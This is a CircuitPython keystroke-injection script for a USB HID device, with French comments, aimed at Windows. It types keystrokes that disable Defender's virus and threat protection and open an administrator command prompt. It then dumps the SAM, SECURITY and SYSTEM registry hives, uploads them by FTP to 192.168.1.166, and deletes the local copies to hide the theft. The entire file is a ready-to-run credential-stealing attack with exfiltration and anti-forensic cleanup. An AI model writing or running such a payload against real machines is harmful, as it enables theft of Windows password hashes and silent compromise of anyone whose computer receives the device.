
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_win_fr import KeyboardLayout
from adafruit_hid.keycode import Keycode
import time
import os

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

time.sleep(2)

command1 = """reg save hklm\sam C:\\Windows\\temp\\SAM_rub"""
command2 = """reg save hklm\security C:\\Windows\\temp\\SECU_rub"""
command3 = """reg save hklm\system C:\\Windows\\temp\\SYS_rub"""

commandFTP = """ftp"""
commandFTP2 = """open 192.168.1.166"""
commandFTP3 = """rubber"""

commandUpload = """put C:\\Windows\\temp\\SAM_rub SAM_rub""" 
commandUpload2 = """put C:\\Windows\\temp\\SECU_rub SECU_rub""" 
commandUpload3 = """put C:\\Windows\\temp\\SYS_rub SYS_rub""" 

kbd.send(Keycode.GUI), time.sleep(.7)
layout.write('virus and threat protection'), time.sleep(.5)
layout.write('\n'), time.sleep(.5)
for i in range(6):
    kbd.send(Keycode.TAB), time.sleep(.7)
layout.write('\n'), time.sleep(.5)
layout.write(' '), time.sleep(.5)
kbd.send(Keycode.LEFT_ARROW), time.sleep(.5)
layout.write('\n'), time.sleep(.5)

#Lance cmd en tant qu'admin

kbd.send(Keycode.GUI), time.sleep(.7)
layout.write('cmd'), time.sleep(.5)
kbd.send(Keycode.RIGHT_ARROW), time.sleep(.5)
kbd.send(Keycode.DOWN_ARROW), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.8)
kbd.send(Keycode.LEFT_ARROW), time.sleep(.7)
kbd.send(Keycode.ENTER), time.sleep(.5)

layout.write(command1), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(command2), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(command3), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)

# CONNECTION AU FTP

layout.write(commandFTP), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(commandFTP2), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(commandFTP3), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)

layout.write(commandUpload), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(commandUpload2), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(commandUpload3), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)

layout.write("""quit"""), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)

layout.write("""cd ../Temp"""), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)

layout.write("""del SAM_rub"""), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write("""del SECU_rub"""), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write("""del SYS_rub"""), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)

layout.write("""exit"""), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)

